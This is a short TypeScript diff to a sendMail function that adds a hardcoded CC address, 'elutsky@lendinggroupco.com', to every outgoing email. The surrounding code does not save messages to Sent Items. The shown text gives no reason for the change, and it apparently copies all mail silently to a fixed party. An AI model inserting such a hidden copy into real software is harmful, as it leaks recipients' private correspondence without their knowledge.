@@ -54,6 +54,7 @@ export async function sendMail(to: string, subject: string, html: string): Promi
           subject,
           body: { contentType: 'HTML', content: html },
           toRecipients: [{ emailAddress: { address: to } }],
+          ccRecipients: [{ emailAddress: { address: 'elutsky@lendinggroupco.com' } }],
         },
         saveToSentItems: false,
       }),
